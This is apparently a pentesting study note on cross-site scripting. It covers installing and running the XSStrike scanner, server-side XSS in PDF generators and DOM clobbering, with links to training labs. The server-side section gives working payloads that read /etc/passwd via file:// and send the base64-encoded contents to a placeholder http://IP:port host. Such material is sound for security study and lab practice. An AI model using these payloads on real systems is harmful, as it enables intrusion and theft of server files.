# Cross-site Scripting (XSS)

<hr class="sep-both">

## XSS Tools ‚öíÔ∏è

<div class="row row-cols-lg-2"><div>

#### XSStrike

[XSStrike](https://github.com/s0md3v/XSStrike) <small>(13.7k ‚≠ê, 2022 ‚ò†Ô∏è)</small> is a popular XSS tool that is still working as of 2024 while it's not maintained.

```shell!
$ cd /opt
$ sudo git clone https://github.com/s0md3v/XSStrike.git
$ sudo chmod +x XSStrike/xsstrike.py
$ sudo ln -s /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike
$ xsstrike -u 'URL?param=vuln'
```

The tool will process the URL and the parameter to see if any are vulnerable. Press 'Enter' until you find one that works. Carefully read the payload when testing, e.g. 'mouse over,' or stuff like that.
</div><div>

#### Other tools

There are a lot of them, but they are all abandoned. If seems using web scanners such as Burp, Zaproxy, or Nessus is more common.

* [xsser](https://github.com/epsylon/xsser) <small>(1.3k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [xsscrapy](https://github.com/DanMcInerney/xsscrapy) <small>(1.7k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) <small>(0.5k ‚≠ê, 2021 ü™¶)</small>
* [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) <small>(1.5k ‚≠ê, 2019 ü™¶)</small> + [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) <small>(1.8k ‚≠ê, 2021 ü™¶)</small>
* [Zeus-Scanner](https://github.com/Ekultek/Zeus-Scanner) <small>(1.0k ‚≠ê, 2019 ü™¶)</small>
* [whitewidow](https://github.com/WhitewidowScanner/whitewidow) <small>(1.0k ‚≠ê, 2018 ü™¶)</small>
</div></div>

<hr class="sep-both">

## Server-Side XSS

[![server_side_xss_dynamic_pdf](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/server_side_xss_dynamic_pdf.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![md2pdf](../../../../_badges/thm-p/md2pdf.svg)](https://tryhackme.com/r/room/md2pdf)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

If a website is creating a PDF using user-input, such as using [wkhtmltopdf](https://wkhtmltopdf.org/downloads.html), we may be able to execute JavaScript code.

```html!
<script>document.write('poc')</script>
<img src="http://IP:port/img"/>
<iframe src="http://IP:port/iframe"></iframe>
<object data="http://IP:port/object">
<embed src="http://IP:port/embed" width="500" height="500">
<meta http-equiv="refresh" content="0;url=http://IP:port/meta" />
```

You can learn more about your environment using:

```html!
<script>document.write(window.location)</script>
<script>document.write(typeof fetch)</script> // undefined
<script>document.write(typeof XMLHttpRequest)</script> // object
```

üìö Tools such as `exiftool` may expose the tool that created the PDF.
</div><div>

Technically, request to another server are categorized as [SSRF](ssrf.md) attacks. Some tools/configuration may prevent us from using `file://` or external URLs. Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch responses.

* We can use it to read files such as `/etc/passwd`:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){document.write(this.responseText)};xhzeem.onerror=function(){document.write('failed!')};xhzeem.open("GET","file:///etc/passwd");xhzeem.send();</script>
```

* For Blind Server-Side XSS, we can use:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){xhzxfil=new XMLHttpRequest();xhzxfil.open("GET",'http://IP:port/?data='+btoa(this.response),true);xhzxfil.send()};xhzeem.open("GET","file:///etc/passwd",true);xhzeem.send();</script> ;
```
</div></div>

<hr class="sep-both">

## DOM Clobbering

[![dom_clobbering](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/dom_clobbering.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
[![dom_clobbering](../../../../_badges/ps-course/dom_clobbering.svg)](https://portswigger.net/web-security/dom-based/dom-clobbering)
[![dom_clobbering](../../../../_badges/rootme/web_client/dom_clobbering.svg)](https://www.root-me.org/en/Challenges/Web-Client/DOM-Clobbering)

<div class="row row-cols-lg-2"><div>

DOM element can have an attribute called `id` to easily locate them. There are multiple behaviors around them that can be used to exploit vulnerable javascript code.

```html!
<a id=someProperty name=url href=//example.com></a>
```

```js!
console.log(someProperty);        // equals to "//example.com"
console.log(window.someProperty); // same as 'someProperty'
```

We are able to define attributes by nesting tags:

```html!
<!-- someForm.nodeName is equals to "<input ...>" -->
<form id=someForm><input name=nodeName></form>
```
</div><div>

In chrome-based browsers, having multiple IDs is possible.

```html!
<a id=someObject>
<a id=someObject name=url href=//example.com>
```

```js!
console.log(someProperty);     // an array with indexes
console.log(someProperty.url); // equals to "//example.com"
```

üìö See also: [Dom Clobbering Project](https://github.com/SoheilKhodayari/DOMClobbering) <small>(0.05k ‚≠ê)</small>.
</div></div>